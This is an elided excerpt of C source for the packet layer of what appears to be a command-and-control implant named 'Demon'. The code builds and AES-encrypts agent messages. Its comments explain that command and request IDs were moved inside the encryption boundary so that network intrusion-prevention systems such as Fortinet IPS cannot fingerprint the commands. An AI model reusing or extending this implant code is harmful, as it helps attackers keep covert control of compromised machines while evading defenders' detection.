...
#ifdef DEBUG
    PRINTF( "[DEBUG::PackageCreateWithMetaData] Adding magic value: 0x%08x\n", DEMON_MAGIC_VALUE );
#endif
...
BOOL PackageTransmitNow(
    ...
    if ( Package )
    {
        ...
        if ( Package->Encrypt )
        {
            // Header: [Size][Magic][AgentID] = 3 * 4 = 12 bytes cleartext (routing only)
            // CommandID and RequestID are ENCRYPTED along with the payload
            // This eliminates cleartext command fingerprinting (Fortinet IPS etc.)
            Padding = sizeof( UINT32 ) * 3;  // 12 bytes

            PRINTF_DONT_SEND("[PKG] Encrypting: total=%lu padding=%lu encrypt_len=%lu AESKey=%p\n",
                             Package->Length, Padding, Package->Length - Padding, Instance->Config.AES.Key);

            if (Instance->Config.AES.Key && Instance->Config.AES.IV) {
            ...
            AesXCryptBuffer( &AesCtx, Package->Buffer + Padding, Package->Length - Padding );
                ...
                PUTS_DONT_SEND("[PKG] ERROR: AES Key or IV is NULL, cannot encrypt!");
            }
        } else {
            PUTS_DONT_SEND("[PKG] Package->Encrypt is FALSE, not encrypting");
        }
...
BOOL PackageTransmitAll(
    ...
    /*
     *  Cleartext Header (routing only):
     *  [ SIZE         ] 4 bytes
     *  [ Magic Value  ] 4 bytes
     *  [ Agent ID     ] 4 bytes
     *  --- encryption boundary ---
     *  [ COMMAND ID   ] 4 bytes  (ENCRYPTED)
     *  [ Request ID   ] 4 bytes  (ENCRYPTED)
     *  [ inner data   ] variable (ENCRYPTED)
    */
    Padding = sizeof( UINT32 ) * 3;  // Only Size + Magic + AgentID are cleartext
